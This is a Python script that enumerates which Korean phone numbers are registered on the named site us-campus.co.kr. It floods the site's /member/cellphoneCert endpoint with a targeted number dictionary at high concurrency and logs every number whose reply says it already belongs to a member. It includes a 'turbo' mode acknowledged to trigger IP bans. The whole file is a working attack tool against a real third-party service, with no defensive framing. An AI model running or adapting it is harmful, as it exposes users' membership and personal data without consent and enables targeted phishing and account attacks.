#!/usr/bin/env python3
"""
us-campus.co.kr 高速手机号枚举
用法: python3 fast_phone_enum.py --dict phones_kr_targeted.txt [--concurrency 120] [--turbo]
"""
import asyncio
import aiohttp
import argparse
import json
import time

BASE = "https://us-campus.co.kr"
H_BASE = {
    "User-Agent": "Mozilla/5.0",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": f"{BASE}/member/join",
}
HIT_MSG = "이미 회원"


async def _get_session(connector):
    s = aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar())
    await s.get(f"{BASE}/member/join", ssl=False, timeout=aiohttp.ClientTimeout(total=8))
    return s


async def check_one(phone: str, session: aiohttp.ClientSession, sem: asyncio.Semaphore):
    async with sem:
        try:
            async with session.post(
                f"{BASE}/member/cellphoneCert",
                data={"countryCode": "82", "cellphone": phone},
                headers=H_BASE,
                ssl=False,
                timeout=aiohttp.ClientTimeout(total=8, connect=3),
            ) as resp:
                text = await resp.text()
                if HIT_MSG in text:
                    return phone
        except Exception:
            pass
    return None


async def run(phones: list, concurrency: int, workers: int, turbo: bool, report_every: int):
    conn = aiohttp.TCPConnector(
        limit=concurrency + workers + 10,
        limit_per_host=concurrency + workers + 10,
        ssl=False,
        ttl_dns_cache=600,
    )
    sem = asyncio.Semaphore(concurrency)
    hits = []
    done = 0
    total = len(phones)
    t0 = time.time()
    last_report = 0

    async with aiohttp.ClientSession(connector=conn) as _:
        sessions = [await _get_session(conn) for _ in range(workers)]
        try:
            tasks = [
                asyncio.create_task(check_one(p, sessions[i % workers], sem))
                for i, p in enumerate(phones)
            ]
            for coro in asyncio.as_completed(tasks):
                r = await coro
                if r:
                    hits.append(r)
                    print(f"[HIT] {r}", flush=True)
                done += 1
                if not turbo and done % 500 == 0:
                    await asyncio.sleep(0.02)
                if done - last_report >= report_every or done == total:
                    elapsed = time.time() - t0
                    rate = done / elapsed if elapsed else 0
                    print(
                        f"[进度] {done:,}/{total:,} ({100*done/total:.1f}%) "
                        f"命中={len(hits)} 速度={rate:.0f}/s",
                        flush=True,
                    )
                    last_report = done
        finally:
            for s in sessions:
                await s.close()

    return hits, time.time() - t0


def load_phones(path: str, limit: int = 0) -> list:
    phones = []
    with open(path) as f:
        for line in f:
            p = line.strip().replace("-", "")
            if p.startswith("010") and len(p) == 11 and p.isdigit():
                phones.append(p)
            elif p.startswith(("011", "016", "017", "018", "019")) and len(p) == 11:
                phones.append(p)
            if limit and len(phones) >= limit:
                break
    return phones


async def amain(args):
    phones = load_phones(args.dict, args.limit)
    mode = "turbo" if args.turbo else "normal"
    print(f"字典: {args.dict}")
    print(f"手机号: {len(phones):,}  并发: {args.concurrency}  workers: {args.workers}  模式: {mode}")
    print("接口: POST /member/cellphoneCert")
    print("-" * 50)

    hits, elapsed = await run(
        phones, args.concurrency, args.workers, args.turbo, args.report_every
    )

    result = {
        "target": BASE,
        "dict": args.dict,
        "scanned": len(phones),
        "hits": hits,
        "hit_count": len(hits),
        "elapsed_sec": round(elapsed, 1),
        "rate_per_sec": round(len(phones) / elapsed, 1) if elapsed else 0,
    }
    with open(args.out, "w") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)

    print("-" * 50)
    print(f"完成: 扫描 {len(phones):,}  命中 {len(hits)}  耗时 {elapsed:.0f}s  速度 {result['rate_per_sec']}/s")
    print(f"结果: {args.out}")
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--dict", default="/workspace/us-campus-recon/dict/phones_kr_targeted.txt")
    parser.add_argument("--concurrency", type=int, default=120)
    parser.add_argument("--workers", type=int, default=20)
    parser.add_argument("--turbo", action="store_true", help="全速模式(无限速,易封IP)")
    parser.add_argument("--out", default="/workspace/us-campus-recon/dict/phone_hits.json")
    parser.add_argument("--limit", type=int, default=0)
    parser.add_argument("--report-every", type=int, default=1000)
    args = parser.parse_args()
    asyncio.run(amain(args))


if __name__ == "__main__":
    main()
